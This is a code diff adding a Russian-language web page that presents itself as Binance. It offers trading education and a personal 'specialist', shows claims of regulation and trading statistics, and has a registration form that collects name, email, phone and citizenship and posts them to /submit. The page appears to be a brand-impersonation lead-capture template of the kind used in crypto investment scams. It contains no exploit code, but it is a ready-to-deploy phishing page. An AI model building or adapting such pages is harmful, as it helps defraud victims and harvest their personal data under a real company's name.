@@ -1,0 +1,775 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Binance</title>
+
+    <link rel="shortcut icon" type="image/png" href="../static/favicon.ico">
+
+    <link href="../static/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
+    <link rel="stylesheet" href="../static/css/leadForm.css">
+
+
+    <link rel="stylesheet" href="../static/css/style.css">
+    <link rel="stylesheet" href="../static/css/leadForm(1).css">
+
+    <link rel="stylesheet" href="../static/css/intlTelInput.css">
+    <link rel="stylesheet" href="../static/css/adict.css">
+    <script src="../static/js/jquery-3.6.0.js" crossorigin="anonymous"></script>
+</head>
+
+<body>
+    <header class="header">
+        <div class="header__container container-local">
+            <a href=""
+                onclick="document.location.hash='';return false;"><img src="../static/images/header-logo.png" class="header__logo"
+                                                                       alt="logo"></a>
+            <nav class="header__nav">
+                <a class="header__nav-link"
+                    onclick="document.location.hash='achievment';return false;">О нас</a>
+                <a class="header__nav-link"
+                    onclick="document.location.hash='register';return false;">Торговля</a>
+                <a class="header__nav-link"
+                    onclick="document.location.hash='register';return false;">Earn</a>
+                <a class="header__nav-link"
+                    onclick="document.location.hash='solution';return false;">Финансы</a>
+                <a class="header__nav-link"
+                    onclick="document.location.hash='contacts';return false;">Feed</a>
+            </nav>
+
+            <div class="header__button" onclick="document.location.hash='register';return false;">
+                Зарегистрироваться
+            </div>
+
+
+
+            <div id="menu-popup" class="menu-popup">
+                <div class="menu-popup-upper">
+                    <img class="menu-popup-logo" src="../static/images/header-logo.png" alt="logo">
+
+                    <p id="menu-popup-closer" class="menu-popup-closer" onclick="closeMenu()">✕</p>
+                </div>
+
+                <div class="menu-popup-links">
+                    <a href=""
+                        onclick="closeMenu();document.location.hash='achievment';return false;">О нас</a>
+                    <a href=""
+                        onclick="closeMenu();  ;document.location.hash='register';return false;">Торговля</a>
+                    <a href=""
+                        onclick="closeMenu();document.location.hash='register';return false;">Earn</a>
+                    <a href=""
+                        onclick="closeMenu();document.location.hash='solution';return false;"> Финансы</a>
+                    <a href=""
+                        onclick="closeMenu();document.location.hash='contacts';return false;">Feed</a>
+                </div>
+            </div>
+        </div>
+    </header>
+
+
+    <section class="main">
+
+        <img src="../static/images/bg-main.png" class="main__bg" alt="bg-main">
+
+        <div class="main__container container-local">
+            <img src="../static/images/header-logo.png" class="main__logo" alt="logo">
+            <h1 class="main__title">
+                Ваша надежная платформа открывает обучение.
+            </h1>
+            <p class="main__text">Binance предоставляет доступ к обучению торговле в области цифровых активов для
+                физических лиц из Европейского Союза.</p>
+            <div class="main__button" onclick="document.location.hash='register';return false;">
+                Начать
+            </div>
+        </div>
+    </section>
+
+    <section id="solution" class="solution">
+        <div class="solution__container container-local">
+            <h2 class="solution__title title">Индивидуальные решения, созданные нашими специалистами для людей, которые
+                хотят работать сами на себя,
+                достигнуть своих целей с помощью инвестиций в цифровые активы.</h2>
+
+            <div class="solution__columns">
+                <div class="solution__col1">
+                    <div class="solution__cards">
+                        <div class="solution__card">
+                            <div class="solution__card-left">
+                                <img src="../static/fonts/trading-otc-new.svg" class="solution__card-img" alt>
+                            </div>
+                            <div class="solution__card-right">
+                                <h3 class="solution__card-title">Исполнение и внебиржевые услуги</h3>
+                                <p class="solution__card-text">Получите доступ к гибким решениям по внебиржевой торговле
+                                    (OTC).</p>
+                                <a href=""
+                                    class="solution__card-link"> Подробнее <svg xmlns="http://www.w3.org/2000/svg"
+                                        viewBox="0 0 24 24" fill="none" class="css-99vcbp">
+                                        <path fill-rule="evenodd" clip-rule="evenodd"
+                                            d="M12.288 12l-3.89 3.89 1.768 1.767L15.823 12l-1.768-1.768-3.889-3.889-1.768 1.768 3.89 3.89z"
+                                            fill="currentColor" />
+                                    </svg></a>
+                            </div>
+                        </div>
+
+                        <div class="solution__card">
+                            <div class="solution__card-left">
+                                <img src="../static/fonts/custody-new.svg" class="solution__card-img" alt>
+                            </div>
+                            <div class="solution__card-right">
+                                <h3 class="solution__card-title">Управление активами & Хранение</h3>
+                                <p class="solution__card-text">Храните и управляйте своими цифровыми активами на
+                                    лицензированной и регулируемой платформе.</p>
+                                <a href=""
+                                    class="solution__card-link"> Подробнее <svg xmlns="http://www.w3.org/2000/svg"
+                                        viewBox="0 0 24 24" fill="none" class="css-99vcbp">
+                                        <path fill-rule="evenodd" clip-rule="evenodd"
+                                            d="M12.288 12l-3.89 3.89 1.768 1.767L15.823 12l-1.768-1.768-3.889-3.889-1.768 1.768 3.89 3.89z"
+                                            fill="currentColor" />
+                                    </svg></a>
+                            </div>
+                        </div>
+
+                        <div class="solution__card">
+                            <div class="solution__card-left">
+                                <img src="../static/fonts/liquidity-program-new.svg" class="solution__card-img" alt>
+                            </div>
+                            <div class="solution__card-right">
+                                <h3 class="solution__card-title">Программа Support</h3>
+                                <p class="solution__card-text">Получайте личного специалиста команды Binance,
+                                    который будет предоставлять Вам актуальную информацию о ситуации на рынке и помогать
+                                    со всеми вопросами.</p>
+                                <a href=""
+                                    class="solution__card-link"> Подать заявку <svg xmlns="http://www.w3.org/2000/svg"
+                                        viewBox="0 0 24 24" fill="none" class="css-99vcbp">
+                                        <path fill-rule="evenodd" clip-rule="evenodd"
+                                            d="M12.288 12l-3.89 3.89 1.768 1.767L15.823 12l-1.768-1.768-3.889-3.889-1.768 1.768 3.89 3.89z"
+                                            fill="currentColor" />
+                                    </svg></a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="solution__col2">
+                    <img class="solution__col2-img" src="../static/fonts/solutions-bg-new.svg" alt="solutions">
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="achievment" class="achievment">
+        <div class="achievment__container container-local">
+            <div class="achievment__columns">
+                <div class="achievment__col1">
+                    <h2 class="achievment__title title">Почему компании <br> выбирают Binance</h2>
+                    <p class="achievment__text">Являясь инноватором в индустрии цифровых активов,
+                        Binance предлагает индивидуальные передовые решения для всех типов
+                        инвестиций:</p>
+
+                    <div class="achievment__text-middle">
+
+                        <span> Управление активами </span>
+                        <span> Брокеры </span>
+                        <span> Хедж-фонды </span>
+                        <span> Семейные офисы </span>
+                        <span> Проп-трейдинговые компании </span>
+                        <span> Поставщики ликвидности </span>
+                        <span> Частные лица с высоким уровнем дохода </span>
+                        <span> Компании, занимающиеся майнингом </span>
+
+                    </div>
+
+                    <div class="achievment__text-list">
+                        <p class="achievment__text-list-element"> <svg class="achievment__text-list-element-mark"
+                                xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
+                                <path
+                                    d="M470.6 105.4c12.5 12.5 12.5 32.8 0 45.3l-256 256c-12.5 12.5-32.8 12.5-45.3 0l-128-128c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0L192 338.7 425.4 105.4c12.5-12.5 32.8-12.5 45.3 0z" />
+                            </svg>Более 1450 спотовых торговых пар</p>
+                        <p class="achievment__text-list-element"> <svg class="achievment__text-list-element-mark"
+                                xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
+                                <path
+                                    d="M470.6 105.4c12.5 12.5 12.5 32.8 0 45.3l-256 256c-12.5 12.5-32.8 12.5-45.3 0l-128-128c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0L192 338.7 425.4 105.4c12.5-12.5 32.8-12.5 45.3 0z" />
+                            </svg>Крупнейший объем торговли фьючерсами — более 200 контрактов</p>
+                        <p class="achievment__text-list-element"> <svg class="achievment__text-list-element-mark"
+                                xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
+                                <path
+                                    d="M470.6 105.4c12.5 12.5 12.5 32.8 0 45.3l-256 256c-12.5 12.5-32.8 12.5-45.3 0l-128-128c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0L192 338.7 425.4 105.4c12.5-12.5 32.8-12.5 45.3 0z" />
+                            </svg>Многогранная экосистема блокчейна Binance</p>
+                        <p class="achievment__text-list-element"> <svg class="achievment__text-list-element-mark"
+                                xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
+                                <path
+                                    d="M470.6 105.4c12.5 12.5 12.5 32.8 0 45.3l-256 256c-12.5 12.5-32.8 12.5-45.3 0l-128-128c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0L192 338.7 425.4 105.4c12.5-12.5 32.8-12.5 45.3 0z" />
+                            </svg>Доступ к самому большому криптовалютному пулу ликвидности</p>
+                    </div>
+
+                </div>
+                <div class="achievment__col2">
+                    <div class="achievment__cards">
+                        <div class="achievment__cards-row achievment__cards-row1">
+                            <div class="achievment__card">
+                                <h4 class="achievment__card-title">1-е место</h4>
+                                <p class="achievment__card-text">по совокупности спотового и фьючерсного торговых
+                                    объемов</p>
+                            </div>
+                            <div class="achievment__card">
+                                <h4 class="achievment__card-title">100 млрд долларов</h4>
+                                <p class="achievment__card-text">24-часовой максимум объема торгов</p>
+                            </div>
+                        </div>
+
+                        <div class="achievment__cards-row achievment__cards-row2">
+                            <div class="achievment__card">
+                                <h4 class="achievment__card-title">7,7 трлн <br> долларов</h4>
+                                <p class="achievment__card-text">годовой объем торгов</p>
+                            </div>
+                            <div class="achievment__card">
+                                <h4 class="achievment__card-title">90 млн</h4>
+                                <p class="achievment__card-text">зарегистрированных пользователей</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="register" class="register">
+        <h2 class="register__title title">Откройте для себя мир цифровых активов вместе с Binance</h2>
+        <form class="form-group" method="post" action="/submit" id="form1">
+            <div class="commonInputDiv">
+                <input type="text" name="f_name" class="commonD" placeholder="Ваше Имя" data-siid="si_input_4">
+                <div class="help-block help-block-error"></div>
+            </div>
+            <div class="commonInputDiv">
+                <input type="text" name="l_name" class="commonD" placeholder="Ваша Фамилия" data-siid="si_input_5">
+                <div class="help-block help-block-error"></div>
+            </div>
+            <div class="commonInputDiv">
+                <input type="email" name="email" class="commonD" placeholder="Email" data-siid="si_input_6"
+                    data-si-pw="0">
+                <div class="help-block help-block-error"></div>
+            </div>                
+            <div class="iti iti--allow-dropdown iti--separate-dial-code">
+                <div class="iti__flag-container">
+                    <select class="iti__selected-flag" name="country_code" id="countryCode" style="margin-right: 5px;">
+                        <option value="+7">🇷🇺+7ㅤㅤㅤRussia</option>
+                        <option value="+1">🇺🇸+1ㅤㅤㅤUnited States</option>
+                        <option value="+44">🇬🇧+44ㅤㅤㅤUnited Kingdom</option>
+                        <option value="+374">🇦🇲+374ㅤArmenia</option>
+                        <option value="+61">🇦🇺+61ㅤㅤㅤAustralia</option>
+                        <option value="+43">🇦🇹+43ㅤㅤㅤAustria</option>
+                        <option value="+994">🇦🇿+994ㅤㅤAzerbaijan</option>
+                        <option value="+973">🇧🇭+973ㅤㅤBahrain</option>
+                        <option value="+880">🇧🇩+880ㅤㅤBangladesh</option>
+                        <option value="+375">🇧🇾+375ㅤㅤBelarus</option>
+                        <option value="+32">🇧🇪+32ㅤㅤㅤBelgium</option>
+                        <option value="+975">🇧🇹+975ㅤㅤBhutan</option>
+                        <option value="+387">🇧🇦+387ㅤㅤBosnia and Herzegovina</option>
+                        <option value="+673">🇧🇳+673ㅤㅤBrunei</option>
+                        <option value="+359">🇧🇬+359ㅤㅤBulgaria</option>
+                        <option value="+855">🇰🇭+855ㅤㅤCambodia</option>
+                        <option value="+1">🇨🇦+1ㅤㅤㅤCanada</option>
+                        <option value="+56">🇨🇱+56ㅤㅤㅤChile</option>
+                        <option value="+86">🇨🇳+86ㅤㅤㅤChina</option>
+                        <option value="+61">🇨🇽+61ㅤㅤㅤChristmas Island</option>
+                        <option value="+61">🇨🇨+61ㅤㅤㅤCocos (Keeling) Islands</option>
+                        <option value="+57">🇨🇴+57ㅤㅤㅤColombia</option>
+                        <option value="+269">🇰🇲+269ㅤComoros</option>
+                        <option value="+243">🇨🇩+243ㅤㅤCongo (DRC)</option>
+                        <option value="+242">🇨🇬+242ㅤㅤCongo (Republic)</option>
+                        <option value="+682">🇨🇰+682ㅤㅤCook Islands</option>
+                        <option value="+506">🇨🇷+506ㅤㅤCosta Rica</option>
+                        <option value="+225">🇨🇮+225ㅤㅤCôte d’Ivoire</option>
+                        <option value="+385">🇭🇷+385ㅤㅤCroatia</option>
+                        <option value="+357">🇨🇾+357ㅤㅤCyprus</option>
+                        <option value="+420">🇨🇿+420ㅤㅤCzech Republic</option>
+                        <option value="+45">🇩🇰+45ㅤㅤㅤDenmark</option>
+                        <option value="+372">🇪🇪+372ㅤㅤEstonia</option>
+                        <option value="+358">🇫🇮+358ㅤㅤFinland</option>
+                        <option value="+33">🇫🇷+33ㅤㅤㅤFrance</option>
+                        <option value="+995">🇬🇪+995ㅤㅤGeorgia</option>
+                        <option value="+49">🇩🇪+49ㅤㅤㅤGermany</option>
+                        <option value="+30">🇬🇷+30ㅤㅤㅤGreece</option>
+                        <option value="+299">🇬🇱+299ㅤGreenland</option>
+                        <option value="+1">🇬🇩+1ㅤㅤㅤGrenada</option>
+                        <option value="+590">🇬🇵+590ㅤㅤGuadeloupe</option>
+                        <option value="+1">🇬🇺+1ㅤㅤㅤGuam</option>
+                        <option value="+502">🇬🇹+502ㅤㅤGuatemala</option>
+                        <option value="+44">🇬🇬+44ㅤㅤㅤGuernsey</option>
+                        <option value="+224">🇬🇳+224ㅤGuinea</option>
+                        <option value="+245">🇬🇼+245ㅤGuinea-Bissau</option>
+                        <option value="+592">🇬🇾+592ㅤㅤGuyana</option>
+                        <option value="+509">🇭🇹+509ㅤㅤHaiti</option>
+                        <option value="+504">🇭🇳+504ㅤㅤHonduras</option>
+                        <option value="+852">🇭🇰+852ㅤㅤHong Kong</option>
+                        <option value="+36">🇭🇺+36ㅤㅤㅤHungary</option>
+                        <option value="+354">🇮🇸+354ㅤㅤIceland</option>
+                        <option value="+91">🇮🇳+91ㅤㅤㅤIndia</option>
+                        <option value="+62">🇮🇩+62ㅤㅤㅤIndonesia</option>
+                        <option value="+353">🇮🇪+353ㅤㅤIreland</option>
+                        <option value="+39">🇮🇹+39ㅤㅤㅤItaly</option>
+                        <option value="+81">🇯🇵+81ㅤㅤㅤJapan</option>
+                        <option value="+7">🇰🇿+7ㅤㅤㅤKazakhstan</option>
+                        <option value="+965">🇰🇼+965ㅤㅤKuwait</option>
+                        <option value="+996">🇰🇬+996ㅤㅤKyrgyzstan</option>
+                        <option value="+856">🇱🇦+856ㅤㅤLaos</option>
+                        <option value="+371">🇱🇻+371ㅤㅤLatvia</option>
+                        <option value="+423">🇱🇮+423ㅤㅤLiechtenstein</option>
+                        <option value="+370">🇱🇹+370ㅤㅤLithuania</option>
+                        <option value="+352">🇱🇺+352ㅤㅤLuxembourg</option>
+                        <option value="+60">🇲🇾+60ㅤㅤㅤMalaysia</option>
+                        <option value="+960">🇲🇻+960ㅤㅤMaldives</option>
+                        <option value="+356">🇲🇹+356ㅤㅤMalta</option>
+                        <option value="+596">🇲🇶+596ㅤㅤMartinique</option>
+                        <option value="+230">🇲🇺+230ㅤㅤMauritius</option>
+                        <option value="+262">🇾🇹+262ㅤMayotte</option>
+                        <option value="+52">🇲🇽+52ㅤㅤㅤMexico</option>
+                        <option value="+377">🇲🇨+377ㅤㅤMonaco</option>
+                        <option value="+976">🇲🇳+976ㅤㅤMongolia</option>
+                        <option value="+382">🇲🇪+382ㅤㅤMontenegro</option>
+                        <option value="+1">🇲🇸+1ㅤㅤㅤMontserrat</option>
+                        <option value="+212">🇲🇦+212ㅤㅤMorocco</option>
+                        <option value="+264">🇳🇦+264ㅤㅤNamibia</option>
+                        <option value="+977">🇳🇵+977ㅤㅤNepal</option>
+                        <option value="+31">🇳🇱+31ㅤㅤㅤNetherlands</option>
+                        <option value="+64">🇳🇿+64ㅤㅤㅤNew Zealand</option>
+                        <option value="+505">🇳🇮+505ㅤㅤNicaragua</option>
+                        <option value="+47">🇳🇴+47ㅤㅤㅤNorway</option>
+                        <option value="+968">🇴🇲+968ㅤㅤOman</option>
+                        <option value="+92">🇵🇰+92ㅤㅤㅤPakistan</option>
+                        <option value="+970">🇵🇸+970ㅤㅤPalestine</option>
+                        <option value="+507">🇵🇦+507ㅤㅤPanama</option>
+                        <option value="+675">🇵🇬+675ㅤㅤPapua New Guinea</option>
+                        <option value="+51">🇵🇪+51ㅤㅤㅤPeru</option>
+                        <option value="+63">🇵🇭+63ㅤㅤㅤPhilippines</option>
+                        <option value="+48">🇵🇱+48ㅤㅤㅤPoland</option>
+                        <option value="+351">🇵🇹+351ㅤㅤPortugal</option>
+                        <option value="+974">🇶🇦+974ㅤㅤQatar</option>
+                        <option value="+40">🇷🇴+40ㅤㅤㅤRomania</option>
+                        <option value="+250">🇷🇼+250ㅤㅤRwanda</option>
+                        <option value="+590">🇧🇱+590ㅤSaint Barthélemy</option>
+                        <option value="+1">🇰🇳+1ㅤㅤㅤSaint Kitts and Nevis</option>
+                        <option value="+1">🇱🇨+1ㅤㅤㅤSaint Lucia</option>
+                        <option value="+590">🇲🇫+590ㅤSaint Martin</option>
+                        <option value="+508">🇵🇲+508ㅤSaint Pierre and Miquelon</option>
+                        <option value="+1">🇻🇨+1ㅤㅤㅤSaint Vincent and the Grenadines</option>
+                        <option value="+685">🇼🇸+685ㅤㅤSamoa</option>
+                        <option value="+378">🇸🇲+378ㅤㅤSan Marino</option>
+                        <option value="+966">🇸🇦+966ㅤㅤSaudi Arabia</option>
+                        <option value="+221">🇸🇳+221ㅤㅤSenegal</option>
+                        <option value="+381">🇷🇸+381ㅤㅤSerbia</option>
+                        <option value="+65">🇸🇬+65ㅤㅤㅤSingapore</option>
+                        <option value="+421">🇸🇰+421ㅤㅤSlovakia</option>
+                        <option value="+386">🇸🇮+386ㅤㅤSlovenia</option>
+                        <option value="+27">🇿🇦+27ㅤㅤㅤSouth Africa</option>
+                        <option value="+82">🇰🇷+82ㅤㅤㅤSouth Korea</option>
+                        <option value="+34">🇪🇸+34ㅤㅤㅤSpain</option>
+                        <option value="+94">🇱🇰+94ㅤㅤㅤSri Lanka</option>
+                        <option value="+1">🇻🇮+1ㅤㅤㅤSt. Vincent & Grenadines</option>
+                        <option value="+46">🇸🇪+46ㅤㅤㅤSweden</option>
+                        <option value="+41">🇨🇭+41ㅤㅤㅤSwitzerland</option>
+                        <option value="+886">🇹🇼+886ㅤㅤTaiwan</option>
+                        <option value="+992">🇹🇯+992ㅤㅤTajikistan</option>
+                        <option value="+66">🇹🇭+66ㅤㅤㅤThailand</option>
+                        <option value="+670">🇹🇱+670ㅤㅤTimor-Leste</option>
+                        <option value="+228">🇹🇬+228ㅤㅤTogo</option>
+                        <option value="+676">🇹🇴+676ㅤㅤTonga</option>
+                        <option value="+90">🇹🇷+90ㅤㅤㅤTurkey</option>
+                        <option value="+993">🇹🇲+993ㅤㅤTurkmenistan</option>
+                        <option value="+1">🇹🇨+1ㅤㅤㅤTurks and Caicos Islands</option>
+                        <option value="+256">🇺🇬+256ㅤㅤUganda</option>
+                        <option value="+971">🇦🇪+971ㅤㅤUnited Arab Emirates</option>
+                        <option value="+598">🇺🇾+598ㅤㅤUruguay</option>
+                        <option value="+998">🇺🇿+998ㅤㅤUzbekistan</option>
+                        <option value="+678">🇻🇺+678ㅤㅤVanuatu</option>
+                        <option value="+39">🇸🇲+39ㅤㅤVatican City</option>
+                        <option value="+58">🇻🇪+58ㅤㅤㅤVenezuela</option>
+                        <option value="+84">🇻🇳+84ㅤㅤㅤVietnam</option>
+                        <option value="+681">🇼🇫+681ㅤㅤWallis and Futuna</option>
+                        <option value="+260">🇿🇲+260ㅤㅤZambia</option>
+                        <option value="+263">🇿🇼+263ㅤㅤZimbabwe</option>
+                    </select>
+                    </div><input type="tel" name="phone" class="form-control localPhone" placeholder="912 345-67-89"
+                        autocomplete="off" data-intl-tel-input-id="1" data-iti="1" required="true"
+                        style="padding-left: 77px;" data-siid="si_input_7">
+                    </div>
+                </div>
+                <div class="help-block help-block-error"></div>
+            </div>
+            <div class="commonInputDiv">
+                <select class="form-control" name="location" aria-label="Default select example" id="mycountry" onchange="" required="">
+                    <option value="None" selected="">Выберите ваше гражданство:</option>
+                    <option value="UA">Гражданин Украины</option>
+                    <option value="EU">Гражданин Европы</option>
+                    <option value="RU">Гражданин России</option>
+                    <option value="Other">Гражданин другой страны</option>
+                </select>
+            </div>
+            <button type="submit" id="registerButton" class="leadSubmit">Зарегистрироваться</button>
+        </form>
+        </div>
+    </section>
+
+    <section id="contacts" class="contacts">
+        <div class="contacts__container container-local">
+            <h2 class="contacts__title title">Контакты</h2>
+            <div class="contacts__row">
+                <a href=""
+                    onclick="document.location.hash='';return false;"><img src="../static/images/header-logo.png"
+                        class="contacts__logo" alt="logo"></a>
+
+                <p class="contacts__text contacts__text-email">trade@binance.com</p>
+
+                <p class="contacts__text">16 Rue de la Vanne, 92120 Montrouge, France</p>
+
+                <p class="contacts__text">Montrouge 92120, France</p>
+
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <a
+            href="">
+            <p class="footer__text">Политика конфиденциальности</p>
+        </a>
+        <a
+            href="">
+            <p class="footer__text">Уведомление о риске</p>
+        </a>
+        <p class="footer__text">Binance © 2023</p>
+    </footer>
+
+
+
+
+    <div class="addition">
+        <div class="pop-outer">
+            <div class="pop-bg"></div>
+            <div class="pop-inner">
+                <div class="pop-close">✖</div>
+                <div class="pop-inner__in"><!----><!----><!----><!----></div>
+            </div>
+        </div>
+        <div class="cookie-bar active">
+            <div class="cookie-bar-inner">
+                <div class="cookie-bar-message">
+                    <div><span class="fullscreen-cookie-text">We are using cookies to deliver better experience.</span>
+                        By using this site you are accepting our cookie policy.</div>
+                    <div><a id="cookie-bar-link" data-name="cookies" target="_blank" class="alterlink">Details</a></div>
+                </div>
+                <div class="cookie-bar-buttons"><button id="cookie-bar-btn" onclick="hide()"
+                        type="button">Accept</button></div>
+            </div>
+        </div>
+    </div>
+    <style type="text/css">
+        .addition a {
+            color: #42b983
+        }
+
+        .addition .cookie-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 5px 20px;
+            background: #333;
+            font-family: Open Sans, Helvetica, Arial, sans-serif;
+            font-size: 16px;
+            color: #fff;
+            display: none;
+            z-index: 9999
+        }
+
+        .addition .cookie-bar.active {
+            display: inherit
+        }
+
+        .addition .cookie-bar-inner {
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-pack: justify;
+            -ms-flex-pack: justify;
+            justify-content: space-between;
+            -webkit-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            height: 80px
+        }
+
+        .addition #cookie-bar-link {
+            font-size: 12px
+        }
+
+        .addition .cookie-bar-buttons {
+            text-align: center
+        }
+
+        .addition #cookie-bar-btn {
+            padding: 10px 20px;
+            background: #49c63b;
+            border: unset;
+            color: #fff;
+            cursor: pointer;
+            white-space: nowrap
+        }
+
+        .addition .arCookies {
+            direction: rtl
+        }
+
+        .addition #modal-error .modal-dialog.modal-sm {
+            width: 100%
+        }
+
+        .addition #modal-error button.close {
+            position: relative;
+            z-index: 99999;
+            font-size: 44px;
+            right: 15px
+        }
+
+        .addition .modal-open {
+            overflow: scroll;
+            display: block
+        }
+
+        .addition .cookie-policy,
+        .addition .exit_popup {
+            display: none
+        }
+
+        .addition .cookie-policy.active {
+            display: block
+        }
+
+        .addition button,
+        .addition input {
+            outline: none
+        }
+
+        .addition .pops {
+            cursor: pointer
+        }
+
+        .addition .exit_popup {
+            background: hsla(0, 0%, 100%, .6)
+        }
+
+        .addition .help-block-error {
+            line-height: 1;
+            margin: 0 0 11px;
+            text-align: left;
+            background-color: red;
+            color: #fff
+        }
+
+        .addition .form-container-unique .form-group .help-block.block,
+        .addition form .help-block {
+            display: block
+        }
+
+        .addition .pop-outer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            -webkit-box-pack: center;
+            -ms-flex-pack: center;
+            justify-content: center;
+            z-index: 999;
+            display: none
+        }
+
+        .addition .pop-outer.active {
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: flex
+        }
+
+        .addition .pop-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, .5);
+            z-index: 99
+        }
+
+        .addition .pop-inner {
+            height: 100%;
+            position: relative;
+            z-index: 101;
+            background: #fff;
+            max-width: 80%
+        }
+
+        .addition .pop-inner__in {
+            -webkit-box-sizing: border-box;
+            box-sizing: border-box;
+            overflow-x: hidden;
+            overflow-y: auto;
+            max-width: 100%;
+            max-height: 100%;
+            padding: 0 40px
+        }
+
+        .addition .pop-close,
+        .addition .pop-inner__in,
+        .addition .pop-inner__in h1 {
+            color: #000
+        }
+
+        .addition .pop-close {
+            position: absolute;
+            right: 40px;
+            top: 20px;
+            cursor: pointer;
+            z-index: 5
+        }
+
+        .addition .alterlink {
+            font-family: Open Sans, Helvetica, Arial, sans-serif;
+            cursor: pointer;
+            font-size: 14px
+        }
+
+        .addition .alterlink:hover {
+            text-decoration: underline
+        }
+
+        @media screen and (max-width:1100px) {
+            .addition .cookie-bar {
+                font-size: 14px
+            }
+        }
+
+        @media screen and (max-width:768px) {
+            .addition .cookie-bar {
+                font-size: 12px
+            }
+
+            .addition .pop-inner {
+                max-width: 100%
+            }
+
+            .addition .pop-inner__in {
+                padding: 20px
+            }
+
+            .addition .pop-inner__in svg {
+                width: auto;
+                height: auto
+            }
+
+            .addition .pop-close {
+                right: 20px
+            }
+        }
+
+        @media screen and (max-width:425px) {
+            .addition #cookie-bar-btn {
+                padding: 7px 9px
+            }
+
+            .addition .fullscreen-cookie-text {
+                display: none
+            }
+        }
+
+        .video {
+            position: relative
+        }
+
+        .video-block-inner {
+            width: 100%;
+            position: relative;
+            text-align: center;
+            line-height: 0
+        }
+
+        iframe {
+            width: 100%;
+            margin: auto
+        }
+
+        .over {
+            z-index: 91;
+            height: 100%;
+            cursor: pointer
+        }
+
+        .over,
+        .play-btn {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%
+        }
+
+        .play-btn {
+            height: 87%;
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            -webkit-box-pack: center;
+            -ms-flex-pack: center;
+            justify-content: center;
+            z-index: 3
+        }
+
+        @media screen and (max-width:768px) {
+            .play-btn {
+                opacity: 0;
+                display: none
+            }
+        }
+    </style>
+    <script>
+        let l = document.querySelectorAll('.cookie-bar.active');
+        function hide() {
+
+            l[0].style.display = 'none';
+            l[1].style.display = 'none';
+        }
+        document.getElementById('registerButton').addEventListener('click', function(event) {
+        event.preventDefault(); // Предотвратить отправку формы
+
+        // Получить значения полей ввода
+        var firstName = document.getElementsByName('f_name')[0].value;
+        var lastName = document.getElementsByName('l_name')[0].value;
+        var email = document.getElementsByName('email')[0].value;
+        var countryCode = document.getElementsByName('country_code')[0].value;
+
+        // Проверить, что все поля заполнены
+        if (firstName.trim() === '' || lastName.trim() === '' || email.trim() === '' || countryCode.trim() === '') {
+            alert('Пожалуйста, заполните все поля.');
+            return;
+        }
+
+        // Если все поля заполнены, можно отправить форму
+        document.getElementById('form1').submit();
+    });
+    </script>
+
+
+
+
+
+</body>
+
+</html>
